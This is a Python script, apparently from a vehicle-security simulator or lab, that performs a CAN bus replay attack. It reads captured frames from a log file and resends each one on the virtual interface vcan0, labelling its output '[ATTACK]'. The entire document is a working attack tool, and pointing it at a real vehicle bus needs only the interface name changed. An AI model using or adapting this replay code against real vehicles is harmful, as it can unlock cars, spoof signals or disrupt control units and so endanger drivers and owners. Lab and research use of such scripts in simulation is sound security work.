import can
import time

bus = can.interface.Bus(
    channel='vcan0',
    interface='socketcan'
)

log_file = "simulator/replay.log"

print("[ATTACK] Replay attack started")

try:
    with open(log_file, "r") as f:
        for line in f:
            if "vcan0" not in line:
                continue

            # Extract the ID#DATA part
            try:
                frame = line.strip().split()[-1]   # e.g. 123#20007F00
                can_id_str, data_str = frame.split("#")

                can_id = int(can_id_str, 16)
                data = bytes.fromhex(data_str)

                msg = can.Message(
                    arbitration_id=can_id,
                    data=data,
                    is_extended_id=False
                )

                bus.send(msg)
                print(f"[REPLAYED] ID={can_id_str} DATA={data_str}")

                time.sleep(0.15)

            except Exception as e:
                print(f"[SKIPPED LINE] {line.strip()}")

except KeyboardInterrupt:
    print("\n[ATTACK] Replay attack stopped")

finally:
    bus.shutdown()
